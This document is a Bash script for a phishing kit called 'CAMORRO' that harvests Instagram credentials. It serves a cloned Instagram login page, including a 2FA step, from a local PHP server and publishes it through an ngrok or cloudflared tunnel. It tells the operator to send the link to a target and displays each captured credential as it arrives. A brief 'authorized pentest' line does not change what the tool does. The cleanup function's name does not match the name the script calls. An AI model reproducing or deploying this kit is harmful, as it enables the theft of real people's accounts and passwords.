#!/bin/bash

# ==============================
#   CAMORRO - Instagram Phish
#   Termux / Linux | ngrok
# ==============================

RED='\033[1;31m'
GRN='\033[1;32m'
YLW='\033[1;33m'
BLU='\033[1;34m'
PUR='\033[1;35m'
CYN='\033[1;36m'
WHT='\033[1;37m'
BLK='\033[1;30m'
BG_RED='\033[41m'
BG_BLK='\033[40m'
RST='\033[0m'
BLD='\033[1m'
DIM='\033[2m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
SITE_DIR="$BASE_DIR/sites/instagram"
WWW_DIR="$BASE_DIR/.server/www"
LOG_FILE="$WWW_DIR/saved.usernames.txt"
PID_FILE="$BASE_DIR/.server/pids"

banner() {
    clear
    echo -e "${RED}"
    cat << 'EOF'
   ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗ ██████╗  ██████╗ 
  ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗
  ██║     ███████║██╔████╔██║██║   ██║██████╔╝██████╔╝██║   ██║
  ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██║   ██║
  ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
EOF
    echo -e "${RST}"
    echo -e "  ${BG_RED}${WHT}${BLD}  INSTAGRAM CREDENTIAL HARVESTER  ${RST}"
    echo -e "  ${DIM}${WHT}  Authorized pentest use only · Termux/ngrok${RST}"
    echo -e "  ${PUR}────────────────────────────────────────────${RST}"
    echo ""
}

kill_//() {
    if [[ -f "$PID_FILE" ]]; then
        while read -r pid; do
            kill -9 "$pid" 2>/dev/null
        done < "$PID_FILE"
        rm -f "$PID_FILE"
    fi
    pkill -f "php -S ${HOST}:${PORT}" 2>/dev/null
    pkill -f "ngrok http" 2>/dev/null
    # cloudflared optional cleanup
    pkill -f "cloudflared tunnel" 2>/dev/null
}

cleanup() {
    echo -e "\n${YLW}[*] Shutting down...${RST}"
    kill_all
    exit 0
}
trap cleanup EXIT INT TERM

check_deps() {
    local miss=0
    for bin in php curl; do
        if ! command -v "$bin" &>/dev/null; then
            echo -e "${RED}[!] Missing: $bin${RST}"
            miss=1
        fi
    done
    if [[ $miss -eq 1 ]]; then
        echo -e "${YLW}[*] Termux install:${RST}"
        echo -e "    pkg update && pkg install php curl wget unzip"
        exit 1
    fi
}

setup_www() {
    mkdir -p "$WWW_DIR" "$BASE_DIR/.server"
    rm -rf "${WWW_DIR:?}/"*
    cp -r "$SITE_DIR/"* "$WWW_DIR/"
    : > "$LOG_FILE"
    touch "$PID_FILE"
}

start_php() {
    cd "$WWW_DIR" || exit 1
    php -S "${HOST}:${PORT}" >/dev/null 2>&1 &
    echo $! >> "$PID_FILE"
    sleep 1
    if ! curl -s "http://${HOST}:${PORT}/" >/dev/null; then
        echo -e "${RED}[!] PHP server failed on ${HOST}:${PORT}${RST}"
        exit 1
    fi
    echo -e "${GRN}[+] PHP server  →  http://${HOST}:${PORT}${RST}"
}

# -------- ngrok --------
start_ngrok() {
    if ! command -v ngrok &>/dev/null; then
        echo -e "${RED}[!] ngrok not found${RST}"
        echo -e "${YLW}[*] Install: pkg install wget && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz${RST}"
        echo -e "${YLW}    tar -xzf ngrok-v3-stable-linux-arm64.tgz && mv ngrok \$PREFIX/bin/ && ngrok config add-authtoken YOUR_TOKEN${RST}"
        exit 1
    fi

    ngrok http "${PORT}" --log=stdout >/tmp/camorro_ngrok.log 2>&1 &
    echo $! >> "$PID_FILE"

    echo -e "${CYN}[*] Waiting for ngrok tunnel...${RST}"
    local url=""
    for i in $(seq 1 30); do
        url=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o 'https://[^"]*ngrok[^"]*' | head -n1)
        [[ -n "$url" ]] && break
        sleep 1
    done

    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] ngrok tunnel failed. Check authtoken / network.${RST}"
        cat /tmp/camorro_ngrok.log 2>/dev/null | tail -n 20
        exit 1
    fi

    echo -e "${GRN}[+] Public URL  →  ${WHT}${url}${RST}"
    echo -e "${GRN}[+] Local URL   →  http://${HOST}:${PORT}${RST}"
    echo ""
    echo -e "${PUR}════════════════════════════════════════${RST}"
    echo -e "${YLW}  Send this link to the target:${RST}"
    echo -e "${WHT}${BLD}  ${url}${RST}"
    echo -e "${PUR}════════════════════════════════════════${RST}"
    echo ""
}

# -------- cloudflared (بديل مجاني بدون توكن) --------
start_cloudflared() {
    local cfbin="cloudflared"
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YLW}[*] Downloading cloudflared...${RST}"
        local arch
        arch=$(uname -m)
        local url=""
        case "$arch" in
            aarch64|arm64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
            armv7l|armhf)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
            x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
            *) echo -e "${RED}[!] Unsupported arch: $arch${RST}"; exit 1 ;;
        esac
        wget -q "$url" -O "$BASE_DIR/.server/cloudflared"
        chmod +x "$BASE_DIR/.server/cloudflared"
        cfbin="$BASE_DIR/.server/cloudflared"
    fi

    "$cfbin" tunnel --url "http://${HOST}:${PORT}" --no-autoupdate >/tmp/camorro_cf.log 2>&1 &
    echo $! >> "$PID_FILE"

    echo -e "${CYN}[*] Waiting for cloudflared tunnel...${RST}"
    local url=""
    for i in $(seq 1 40); do
        url=$(grep -o 'https://[-a-z0-9]*\.trycloudflare.com' /tmp/camorro_cf.log 2>/dev/null | head -n1)
        [[ -n "$url" ]] && break
        sleep 1
    done

    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] cloudflared failed${RST}"
        tail -n 20 /tmp/camorro_cf.log
        exit 1
    fi

    echo -e "${GRN}[+] Public URL  →  ${WHT}${url}${RST}"
    echo -e "${GRN}[+] Local URL   →  http://${HOST}:${PORT}${RST}"
    echo ""
    echo -e "${PUR}════════════════════════════════════════${RST}"
    echo -e "${YLW}  Send this link to the target:${RST}"
    echo -e "${WHT}${BLD}  ${url}${RST}"
    echo -e "${PUR}════════════════════════════════════════${RST}"
    echo ""
}

# -------- localhost only --------
start_local() {
    echo -e "${GRN}[+] Local only  →  http://${HOST}:${PORT}${RST}"
    echo -e "${DIM}    (no public tunnel)${RST}"
    echo ""
}

watch_creds() {
    echo -e "${CYN}[*] Listening for credentials... ${DIM}(Ctrl+C to stop)${RST}"
    echo -e "${PUR}────────────────────────────────────────────${RST}"
    echo ""

    local last_size=0
    [[ -f "$LOG_FILE" ]] && last_size=$(wc -c < "$LOG_FILE")

    while true; do
        if [[ -f "$LOG_FILE" ]]; then
            local size
            size=$(wc -c < "$LOG_FILE")
            if [[ "$size" -gt "$last_size" ]]; then
                # اطبع السطور الجديدة فقط
                tail -c +"$((last_size + 1))" "$LOG_FILE" | while IFS= read -r line || [[ -n "$line" ]]; do
                    [[ -z "$line" ]] && continue
                    echo -e "${BG_RED}${WHT}${BLD} ⚠ CREDENTIAL CAPTURED ${RST}"
                    echo -e "${RED}${line}${RST}"
                    echo -e "${PUR}────────────────────────────────────────────${RST}"
                    # تنبيه صوتي على Termux إن وُجد
                    if command -v termux-vibrate &>/dev/null; then
                        termux-vibrate -d 300 2>/dev/null
                    fi
                done
                last_size=$size
            fi
        fi
        sleep 0.8
    done
}

menu() {
    banner
    check_deps
    echo -e "  ${WHT}${BLD}[01]${RST} ${GRN}Instagram${RST}  ${DIM}(login + 2FA)${RST}"
    echo -e "  ${WHT}${BLD}[99]${RST} ${RED}Exit${RST}"
    echo ""
    echo -ne "  ${CYN}camorro${RST}${WHT}@${RST}${RED}select${RST} » "
    read -r choice

    case "$choice" in
        1|01)
            tunnel_menu
            ;;
        99|q|Q|exit)
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option${RST}"
            sleep 1
            menu
            ;;
    esac
}

tunnel_menu() {
    banner
    echo -e "  ${WHT}${BLD}Tunnel type${RST}"
    echo ""
    echo -e "  ${WHT}${BLD}[01]${RST} ${GRN}ngrok${RST}"
    echo -e "  ${WHT}${BLD}[02]${RST} ${GRN}Cloudflared${RST}  ${DIM}(no token)${RST}"
    echo -e "  ${WHT}${BLD}[03]${RST} ${YLW}Localhost only${RST}"
    echo -e "  ${WHT}${BLD}[00]${RST} ${RED}Back${RST}"
    echo ""
    echo -ne "  ${CYN}camorro${RST}${WHT}@${RST}${RED}tunnel${RST} » "
    read -r tchoice

    kill_all
    setup_www
    start_php

    case "$tchoice" in
        1|01) start_ngrok ;;
        2|02) start_cloudflared ;;
        3|03) start_local ;;
        0|00) menu; return ;;
        *) echo -e "${RED}[!] Invalid${RST}"; sleep 1; tunnel_menu; return ;;
    esac

    watch_creds
}

# ---- entry ----
mkdir -p "$BASE_DIR/.server" "$SITE_DIR"
menu
